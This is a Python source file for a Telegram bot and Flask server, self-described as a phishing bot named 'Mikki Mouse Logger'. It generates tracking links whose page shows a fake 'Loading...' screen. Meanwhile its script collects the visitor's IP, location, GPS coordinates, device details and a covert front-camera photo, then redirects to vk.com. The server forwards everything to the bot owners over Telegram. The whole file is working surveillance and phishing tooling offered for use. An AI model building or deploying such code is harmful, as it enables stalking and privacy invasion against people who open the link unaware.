#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import json
import uuid
import time
import threading
import requests
import base64
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string

# ============ КОНФИГ ============
OWNER_IDS = [int(os.environ.get('OWNER_ID', 744709325))]
BOT_TOKEN = os.environ.get('BOT_TOKEN', '')
BASE_URL = os.environ.get('BASE_URL', '')
FISHING_DATA_FOLDER = "fishing_data"
os.makedirs(FISHING_DATA_FOLDER, exist_ok=True)

# ============ РАБОТА С ДАННЫМИ ============
def get_owner_file_path(owner_id):
    return os.path.join(FISHING_DATA_FOLDER, f"owner_{owner_id}.json")

def load_data(owner_id=None):
    if owner_id is None:
        owner_id = OWNER_IDS[0]
    path = get_owner_file_path(owner_id)
    if os.path.exists(path):
        try:
            with open(path, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_data(data, owner_id=None):
    if owner_id is None:
        owner_id = OWNER_IDS[0]
    path = get_owner_file_path(owner_id)
    with open(path, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def get_settings(owner_id=None):
    data = load_data(owner_id)
    return data.get('settings', {
        'redirect': 'https://vk.com/',
        'geo': True,
        'camera': True,
        'links': {}
    })

def save_settings(settings, owner_id=None):
    data = load_data(owner_id)
    data['settings'] = settings
    save_data(data, owner_id)

def generate_link(owner_id=None):
    if owner_id is None:
        owner_id = OWNER_IDS[0]
    settings = get_settings(owner_id)
    link_id = str(uuid.uuid4())[:8]
    if 'links' not in settings:
        settings['links'] = {}
    settings['links'][link_id] = {
        'created': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'visits': []
    }
    save_settings(settings, owner_id)
    return link_id

def delete_link(link_id, owner_id=None):
    if owner_id is None:
        owner_id = OWNER_IDS[0]
    settings = get_settings(owner_id)
    if link_id in settings.get('links', {}):
        del settings['links'][link_id]
        save_settings(settings, owner_id)
        return True
    return False

def get_links(owner_id=None):
    if owner_id is None:
        owner_id = OWNER_IDS[0]
    settings = get_settings(owner_id)
    return settings.get('links', {})

def find_link_owner(link_id):
    for owner_id in OWNER_IDS:
        data = load_data(owner_id)
        links = data.get('settings', {}).get('links', {})
        if link_id in links:
            return owner_id, data
    return None, None

# ============ ФУНКЦИИ ДЛЯ РАБОТЫ С TELEGRAM API ============
def send_message(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': text,
        'parse_mode': 'Markdown'
    }
    if reply_markup:
        payload['reply_markup'] = json.dumps(reply_markup)
    try:
        response = requests.post(url, json=payload)
        return response.json()
    except Exception as e:
        print(f"Ошибка отправки: {e}")
        return None

def send_photo(chat_id, photo_bytes, caption=""):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    try:
        response = requests.post(
            url,
            data={'chat_id': chat_id, 'caption': caption},
            files={'photo': ('photo.jpg', photo_bytes, 'image/jpeg')}
        )
        return response.json()
    except Exception as e:
        print(f"Ошибка отправки фото: {e}")
        return None

def send_document(chat_id, file_path, caption=""):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        with open(file_path, 'rb') as f:
            response = requests.post(
                url,
                data={'chat_id': chat_id, 'caption': caption},
                files={'document': (file_path, f)}
            )
        return response.json()
    except Exception as e:
        print(f"Ошибка отправки файла: {e}")
        return None

def get_updates(offset=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    payload = {'timeout': 30}
    if offset:
        payload['offset'] = offset
    try:
        response = requests.get(url, params=payload, timeout=35)
        return response.json().get('result', [])
    except Exception as e:
        print(f"Ошибка получения обновлений: {e}")
        return []

# ============ СТРАНИЦА-ЛОГГЕР (ВЫНЕСЕНА В ОТДЕЛЬНЫЙ ФАЙЛ) ============
# Создаём папку templates
TEMPLATES_FOLDER = "templates"
os.makedirs(TEMPLATES_FOLDER, exist_ok=True)

# Сохраняем HTML в файл
LOGGER_HTML_PATH = os.path.join(TEMPLATES_FOLDER, "logger.html")
with open(LOGGER_HTML_PATH, 'w', encoding='utf-8') as f:
    f.write('''<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Loading...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0f;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
            flex-direction: column;
            overflow: hidden;
        }
        .loader {
            width: 56px;
            height: 56px;
            border: 3px solid rgba(255,255,255,0.06);
            border-top: 3px solid #7c5cfc;
            border-radius: 50%;
            animation: spin 1s cubic-bezier(0.4,0,0.2,1) infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .loader-text {
            font-size: 14px;
            color: rgba(255,255,255,0.3);
            letter-spacing: 2px;
            text-transform: uppercase;
            margin-top: 20px;
        }
    </style>
</head>
<body>
<div style="text-align:center;">
    <div class="loader"></div>
    <div class="loader-text">Сбор данных...</div>
</div>
<script>
(async function() {
    const linkId = window.location.pathname.split('/').pop();
    let settings = { redirect: 'https://vk.com/', geo: true, camera: true };
    try {
        const res = await fetch('/settings');
        settings = await res.json();
    } catch(e) {}
    async function getIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip || 'Unknown';
        } catch { return 'Unknown'; }
    }
    async function getGeo(ip) {
        try {
            const res = await fetch(`https://ipapi.co/${ip}/json/`);
            const data = await res.json();
            return {
                country: data.country_name || data.country || 'Unknown',
                city: data.city || 'Unknown',
                region: data.region || 'Unknown',
                isp: data.org || 'Unknown',
                latitude: data.latitude || 'Unknown',
                longitude: data.longitude || 'Unknown'
            };
        } catch { return { country: 'Unknown', city: 'Unknown', region: 'Unknown', isp: 'Unknown', latitude: 'Unknown', longitude: 'Unknown' }; }
    }
    function getDevice() {
        const ua = navigator.userAgent;
        let device = 'Desktop', os = 'Unknown', browser = 'Unknown';
        if (/mobile|android|iphone|ipad|ipod/i.test(ua)) device = 'Mobile';
        if (/iPad|Android/i.test(ua) && !/Mobile/i.test(ua)) device = 'Tablet';
        if (/Windows/i.test(ua)) os = 'Windows';
        else if (/Mac/i.test(ua)) os = 'macOS';
        else if (/Linux/i.test(ua)) os = 'Linux';
        else if (/Android/i.test(ua)) os = 'Android';
        else if (/iPhone|iPad|iPod/i.test(ua)) os = 'iOS';
        if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = 'Chrome';
        else if (/Firefox/i.test(ua)) browser = 'Firefox';
        else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
        else if (/Edg/i.test(ua)) browser = 'Edge';
        return { device, os, browser, ua };
    }
    function getScreen() {
        return {
            screen: window.screen.width + 'x' + window.screen.height,
            window: window.innerWidth + 'x' + window.innerHeight
        };
    }
    function getGeolocation() {
        return new Promise(resolve => {
            if (!settings.geo || !navigator.geolocation) {
                resolve({ latitude: 'Denied', longitude: 'Denied', accuracy: 'Disabled' });
                return;
            }
            navigator.geolocation.getCurrentPosition(
                pos => resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy }),
                err => resolve({ latitude: 'Denied', longitude: 'Denied', accuracy: err.message }),
                { enableHighAccuracy: true, timeout: 5000 }
            );
        });
    }
    function getCameraPhoto() {
        return new Promise(resolve => {
            if (!settings.camera) { resolve(null); return; }
            const video = document.createElement('video');
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                audio: false
            })
            .then(stream => {
                video.srcObject = stream;
                video.play();
                setTimeout(() => {
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const photo = canvas.toDataURL('image/jpeg', 0.85);
                    stream.getTracks().forEach(t => t.stop());
                    resolve(photo);
                }, 300);
            })
            .catch(() => resolve(null));
        });
    }
    const ip = await getIP();
    const [geo, device, screen, geolocation, photo] = await Promise.all([
        getGeo(ip),
        getDevice(),
        getScreen(),
        getGeolocation(),
        getCameraPhoto()
    ]);
    const data = {
        link_id: linkId,
        timestamp: new Date().toLocaleString(),
        ip: ip,
        country: geo.country,
        city: geo.city,
        region: geo.region,
        isp: geo.isp,
        geo_lat: geo.latitude,
        geo_lon: geo.longitude,
        gps_lat: geolocation.latitude,
        gps_lon: geolocation.longitude,
        device_type: device.device,
        os: device.os,
        browser: device.browser,
        screen: screen.screen,
        photo: photo
    };
    await fetch('/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    }).catch(() => {});
    setTimeout(() => {
        window.location.href = settings.redirect || 'https://vk.com/';
    }, 600);
})();
</script>
</body>
</html>''')

# ============ КЛАВИАТУРЫ ДЛЯ БОТА ============
def main_kb():
    buttons = [
        [{"text": "⚙️ Настройки", "callback_data": "settings"}],
        [{"text": "🔗 Создать ссылку", "callback_data": "create"}],
        [{"text": "📋 Мои ссылки", "callback_data": "links"}],
        [{"text": "📊 Статистика", "callback_data": "stats"}]
    ]
    if len(OWNER_IDS) > 1:
        buttons.insert(0, [{"text": "👤 Сменить профиль", "callback_data": "switch"}])
    return {"inline_keyboard": buttons}

def switch_kb():
    buttons = []
    for uid in OWNER_IDS:
        buttons.append([{"text": f"👤 {uid}", "callback_data": f"switch_{uid}"}])
    buttons.append([{"text": "🔙 Назад", "callback_data": "back"}])
    return {"inline_keyboard": buttons}

def settings_kb(owner_id):
    s = get_settings(owner_id)
    return {"inline_keyboard": [
        [{"text": f"📍 Гео: {'✅' if s.get('geo', True) else '❌'}", "callback_data": "tgeo"}],
        [{"text": f"📷 Камера: {'✅' if s.get('camera', True) else '❌'}", "callback_data": "tcam"}],
        [{"text": "🔗 Редирект", "callback_data": "redir"}],
        [{"text": "🔙 Назад", "callback_data": "back"}]
    ]}

def links_kb(links):
    buttons = []
    for lid in links:
        v = len(links[lid].get('visits', []))
        buttons.append([{"text": f"🔗 {lid} ({v})", "callback_data": f"link_{lid}"}])
    buttons.append([{"text": "🔙 Назад", "callback_data": "back"}])
    return {"inline_keyboard": buttons}

def link_menu_kb(link_id):
    return {"inline_keyboard": [
        [{"text": "📋 Копировать ссылку", "callback_data": f"copy_{link_id}"}],
        [{"text": "📊 Скачать данные", "callback_data": f"data_{link_id}"}],
        [{"text": "🗑️ Удалить ссылку", "callback_data": f"del_{link_id}"}],
        [{"text": "🔙 Назад", "callback_data": "backlinks"}]
    ]}

def back_kb():
    return {"inline_keyboard": [
        [{"text": "🔙 Назад", "callback_data": "back"}]
    ]}

# ============ ОБРАБОТЧИКИ КОМАНД БОТА ============
user_owner = {}
waiting_redirect = {}

def handle_start(message):
    user_id = message['from']['id']
    if user_id not in OWNER_IDS:
        send_message(user_id, "⚠️ Доступ запрещён! Только владельцы могут использовать этого бота.")
        return
    user_owner[user_id] = user_id
    owner_id = user_owner[user_id]
    text = (
        f"🎣 **Mikki Mouse Logger**\n\n"
        f"👤 **Ваш ID:** `{user_id}`\n"
        f"📊 **Всего владельцев:** {len(OWNER_IDS)}\n"
        f"🔗 **Активный профиль:** `{owner_id}`\n\n"
        f"💡 Создавай ссылки и собирай данные!"
    )
    send_message(user_id, text, main_kb())

def handle_callback(callback):
    user_id = callback['from']['id']
    if user_id not in OWNER_IDS:
        return
    data = callback['data']
    chat_id = callback['message']['chat']['id']
    owner_id = user_owner.get(user_id, user_id)
    
    if data == "switch":
        send_message(chat_id, "👤 **Выберите профиль:**", switch_kb())
        return
    if data.startswith("switch_"):
        uid = int(data.split("_")[1])
        if uid in OWNER_IDS:
            user_owner[user_id] = uid
            send_message(chat_id, f"✅ Переключено на {uid}", main_kb())
        return
    if data == "settings":
        s = get_settings(owner_id)
        text = (
            f"⚙️ **Настройки**\n"
            f"👤 Профиль: `{owner_id}`\n\n"
            f"📍 Гео: {'✅' if s.get('geo', True) else '❌'}\n"
            f"📷 Камера: {'✅' if s.get('camera', True) else '❌'}\n"
            f"🔗 Редирект: `{s.get('redirect', 'https://vk.com/')}`"
        )
        send_message(chat_id, text, settings_kb(owner_id))
        return
    if data == "tgeo":
        s = get_settings(owner_id)
        s['geo'] = not s.get('geo', True)
        save_settings(s, owner_id)
        handle_settings(chat_id, user_id)
        return
    if data == "tcam":
        s = get_settings(owner_id)
        s['camera'] = not s.get('camera', True)
        save_settings(s, owner_id)
        handle_settings(chat_id, user_id)
        return
    if data == "redir":
        waiting_redirect[user_id] = True
        send_message(chat_id, "🔗 **Введите URL для редиректа**\n\nПример: `https://vk.com/`", back_kb())
        return
    if data == "create":
        lid = generate_link(owner_id)
        url = f"{BASE_URL}l/{lid}"
        s = get_settings(owner_id)
        text = (
            f"✅ **Ссылка создана!**\n\n"
            f"🔗 `{url}`\n\n"
            f"👤 Владелец: `{owner_id}`\n"
            f"📍 Гео: {'✅' if s.get('geo', True) else '❌'}\n"
            f"📷 Камера: {'✅' if s.get('camera', True) else '❌'}\n"
            f"🔗 Редирект: `{s.get('redirect', 'https://vk.com/')}`"
        )
        send_message(chat_id, text, {
            "inline_keyboard": [
                [{"text": "📋 Копировать", "callback_data": f"copy_{lid}"}],
                [{"text": "🔙 Назад", "callback_data": "back"}]
            ]
        })
        return
    if data == "links":
        links = get_links(owner_id)
        if not links:
            send_message(chat_id, f"📋 **Нет созданных ссылок**\n\n👤 Профиль: `{owner_id}`", back_kb())
            return
        text = f"📋 **Мои ссылки**\n👤 Профиль: `{owner_id}`\n\n"
        for lid, d in links.items():
            text += f"🔗 `{lid}`: {len(d.get('visits', []))} переходов\n"
        send_message(chat_id, text, links_kb(links))
        return
    if data == "stats":
        links = get_links(owner_id)
        total = sum(len(l.get('visits', [])) for l in links.values())
        countries = {}
        for l in links.values():
            for v in l.get('visits', []):
                country = v.get('country', 'Unknown')
                countries[country] = countries.get(country, 0) + 1
        country_text = ""
        if countries:
            top = sorted(countries.items(), key=lambda x: x[1], reverse=True)[:5]
            country_text = "\n🌍 **Топ стран:**\n"
            for c, count in top:
                country_text += f"   • {c}: {count}\n"
        text = (
            f"📊 **Статистика**\n"
            f"👤 Профиль: `{owner_id}`\n\n"
            f"📌 Всего ссылок: {len(links)}\n"
            f"👥 Всего переходов: {total}"
            f"{country_text}"
        )
        send_message(chat_id, text, back_kb())
        return
    if data.startswith("link_"):
        lid = data.split("_")[1]
        links = get_links(owner_id)
        v = len(links.get(lid, {}).get('visits', []))
        text = (
            f"🔗 **Ссылка:** `{lid}`\n\n"
            f"👥 Переходов: {v}\n"
            f"🔗 URL: `{BASE_URL}l/{lid}`"
        )
        send_message(chat_id, text, link_menu_kb(lid))
        return
    if data.startswith("copy_"):
        lid = data.split("_")[1]
        url = f"{BASE_URL}l/{lid}"
        send_message(chat_id, f"📋 `{url}`")
        return
    if data.startswith("data_"):
        lid = data.split("_")[1]
        links = get_links(owner_id)
        visits = links.get(lid, {}).get('visits', [])
        if not visits:
            send_message(chat_id, "📊 Нет данных")
            return
        fn = f"data_{lid}_{int(time.time())}.txt"
        with open(fn, 'w', encoding='utf-8') as f:
            f.write(f"ДАННЫЕ ССЫЛКИ: {lid}\n")
            f.write("=" * 50 + "\n\n")
            f.write(f"Владелец: {owner_id}\n")
            f.write(f"Всего переходов: {len(visits)}\n\n")
            for i, v in enumerate(visits, 1):
                f.write(f"--- ПЕРЕХОД {i} ---\n")
                f.write(f"Время: {v.get('timestamp', 'Unknown')}\n")
                f.write(f"IP: {v.get('ip', 'Unknown')}\n")
                f.write(f"Страна: {v.get('country', 'Unknown')}\n")
                f.write(f"Город: {v.get('city', 'Unknown')}\n")
                f.write(f"Устройство: {v.get('device_type', 'Unknown')}\n")
                f.write(f"ОС: {v.get('os', 'Unknown')}\n")
                f.write(f"Браузер: {v.get('browser', 'Unknown')}\n")
                f.write(f"Экран: {v.get('screen', 'Unknown')}\n")
                f.write(f"GPS: {v.get('gps_lat', 'Unknown')}, {v.get('gps_lon', 'Unknown')}\n")
                f.write("\n" + "-" * 30 + "\n\n")
        send_document(chat_id, fn, f"Данные для {lid}")
        os.remove(fn)
        return
    if data.startswith("del_"):
        lid = data.split("_")[1]
        if delete_link(lid, owner_id):
            send_message(chat_id, "✅ Ссылка удалена", back_kb())
        return
    if data == "backlinks":
        links = get_links(owner_id)
        text = f"📋 **Мои ссылки**\n👤 Профиль: `{owner_id}`\n\n"
        for lid, d in links.items():
            text += f"🔗 `{lid}`: {len(d.get('visits', []))} переходов\n"
        send_message(chat_id, text, links_kb(links))
        return
    if data == "back":
        waiting_redirect.pop(user_id, None)
        text = (
            f"🎣 **Mikki Mouse Logger**\n\n"
            f"👤 Активный профиль: `{owner_id}`\n\n"
            f"💡 Создавай ссылки и собирай данные!"
        )
        send_message(chat_id, text, main_kb())
        return

def handle_settings(chat_id, user_id):
    owner_id = user_owner.get(user_id, user_id)
    s = get_settings(owner_id)
    text = (
        f"⚙️ **Настройки**\n"
        f"👤 Профиль: `{owner_id}`\n\n"
        f"📍 Гео: {'✅' if s.get('geo', True) else '❌'}\n"
        f"📷 Камера: {'✅' if s.get('camera', True) else '❌'}\n"
        f"🔗 Редирект: `{s.get('redirect', 'https://vk.com/')}`"
    )
    send_message(chat_id, text, settings_kb(owner_id))

def handle_message(message):
    user_id = message['from']['id']
    if user_id not in OWNER_IDS:
        return
    chat_id = message['chat']['id']
    text = message.get('text', '')
    if waiting_redirect.get(user_id):
        if not text.startswith(('http://', 'https://')):
            send_message(chat_id, "❌ Неверный формат! Нужно http:// или https://")
            return
        owner_id = user_owner.get(user_id, user_id)
        s = get_settings(owner_id)
        s['redirect'] = text
        save_settings(s, owner_id)
        waiting_redirect.pop(user_id, None)
        send_message(chat_id, f"✅ Редирект установлен: `{text}`", main_kb())
        return
    if text == '/start':
        handle_start(message)
        return

# ============ ОСНОВНОЙ ЦИКЛ БОТА ============
def bot_loop():
    print("🤖 Бот запущен и слушает...")
    last_update_id = 0
    while True:
        try:
            updates = get_updates(last_update_id + 1 if last_update_id else None)
            for update in updates:
                last_update_id = update.get('update_id', 0)
                if 'message' in update:
                    handle_message(update['message'])
                if 'callback_query' in update:
                    handle_callback(update['callback_query'])
        except Exception as e:
            print(f"Ошибка в цикле бота: {e}")
            time.sleep(5)

# ============ FLASK ПРИЛОЖЕНИЕ ============
app = Flask(__name__)

@app.route('/')
def index():
    return "🤖 Mikki Mouse Logger Bot is running!"

@app.route('/settings')
def get_web_settings():
    data = load_data()
    return jsonify(data.get('settings', {'redirect': 'https://vk.com/', 'geo': True, 'camera': True}))

@app.route('/l/<link_id>')
def logger_page(link_id):
    owner_id, data = find_link_owner(link_id)
    if owner_id is None:
        return 'Ссылка не найдена', 404
    return render_template_string(open(LOGGER_HTML_PATH, 'r', encoding='utf-8').read())

@app.route('/log', methods=['POST'])
def log_data():
    req_data = request.get_json()
    link_id = req_data.get('link_id')
    owner_id, data = find_link_owner(link_id)
    if owner_id is None:
        return jsonify({'status': 'error', 'message': 'Link not found'}), 404
    links = data.get('settings', {}).get('links', {})
    if link_id in links:
        if 'visits' not in links[link_id]:
            links[link_id]['visits'] = []
        links[link_id]['visits'].append(req_data)
        save_data(data, owner_id)
        for uid in OWNER_IDS:
            try:
                text = (
                    f"🎯 НОВЫЙ ПЕРЕХОД!\n\n"
                    f"🔗 ID: {link_id}\n"
                    f"🌍 IP: {req_data.get('ip')}\n"
                    f"📍 Страна: {req_data.get('country')}\n"
                    f"🏙️ Город: {req_data.get('city')}\n"
                    f"📱 Устройство: {req_data.get('device_type')}\n"
                    f"💻 ОС: {req_data.get('os')}\n"
                    f"🌐 Браузер: {req_data.get('browser')}\n"
                    f"📌 GPS: {req_data.get('gps_lat')}, {req_data.get('gps_lon')}"
                )
                send_message(uid, text)
                photo_data = req_data.get('photo')
                if photo_data and ',' in photo_data:
                    header, encoded = photo_data.split(",", 1)
                    photo_bytes = base64.b64decode(encoded)
                    send_photo(uid, photo_bytes, f"📸 Фото с камеры ({link_id})")
            except Exception as e:
                print(f"Ошибка отправки уведомления {uid}: {e}")
    return jsonify({'status': 'ok'})

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json()
    if update:
        if 'message' in update:
            handle_message(update['message'])
        if 'callback_query' in update:
            handle_callback(update['callback_query'])
    return jsonify({'status': 'ok'})

# ============ ЗАПУСК ============
if __name__ == "__main__":
    print("🚀 ЗАПУСК ФИШИНГ БОТА (на requests)")
    print(f"👤 Владельцы: {OWNER_IDS}")
    print(f"🌐 Базовый URL: {BASE_URL}")
    print("=" * 50)
    bot_thread = threading.Thread(target=bot_loop, daemon=True)
    bot_thread.start()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
